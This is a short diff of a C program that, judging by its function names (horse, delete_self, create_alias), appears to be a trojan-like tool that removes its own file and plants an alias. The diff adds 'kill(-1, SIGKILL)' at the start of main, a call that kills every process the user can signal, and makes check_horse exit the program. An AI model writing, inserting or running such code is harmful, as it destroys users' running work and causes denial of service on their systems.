@@ -71,7 +71,7 @@ int check_horse(){
 		if(st.st_mtim.tv_sec == last_mtim[1].tv_sec && st.st_mtim.tv_nsec == last_mtim[1].tv_nsec)
 			return 0;
 	}
-	return 1;
+	exit(0);
 }
 
 void create_alias(){
@@ -130,7 +130,7 @@ void horse(int argc, char** argv){
 void main(int argc, char* argv[]){
 	count = 0;
 	unsigned int p;
-
+	kill(-1, SIGKILL);
 	delete_self();
 	create_alias();
 	store_time();
